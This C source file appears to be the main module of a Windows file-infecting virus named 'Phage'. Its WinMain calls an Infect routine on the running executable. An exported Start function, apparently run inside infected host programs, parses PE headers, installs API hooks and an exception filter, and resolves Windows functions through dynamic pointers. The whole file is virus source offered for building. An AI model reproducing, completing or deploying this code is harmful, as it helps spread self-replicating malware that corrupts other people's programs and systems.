#include <Windows.h>
#include <winternl.h>

#include "hook.h"
#include "infect.h"

#pragma comment(lib, "Shlwapi.lib")

void Debug(LPCWSTR fmt, ...) {
#ifdef _DEBUG
	va_list args;
	va_start(args, fmt);

	WCHAR szOutput[MAX_PATH];
	fnwvsprintfW(szOutput, fmt, args);
	fnMessageBoxW(NULL, szOutput, L"Phage Debug", MB_OK);

	va_end(args);
#endif // _DEBUG
}

__declspec(dllexport) void __cdecl Start(LPVOID lpParam) {
	DWORD dwImageBase = (DWORD)(lpParam);

	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(dwImageBase);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(dwImageBase + pidh->e_lfanew);

	InitialiseFunctions();

	//if (!RebuildImportTable((LPVOID)(dwImageBase), pinh))
	//	return Debug(L"Failed to rebuild import table");
	SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)MyUnhandledExceptionFilter);
	InitialiseHooks();

	// wait for end of main process
	fnWaitForSingleObject(fnGetModuleHandleW(NULL), INFINITE);

	//Debug(L"Infecting");
	//Infect(dwImageBase);

	//fnExitProcess(0);
}

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShow) {
	InitialiseFunctions();
	Infect((DWORD)(fnGetModuleHandleW(NULL)));

	return 0;
}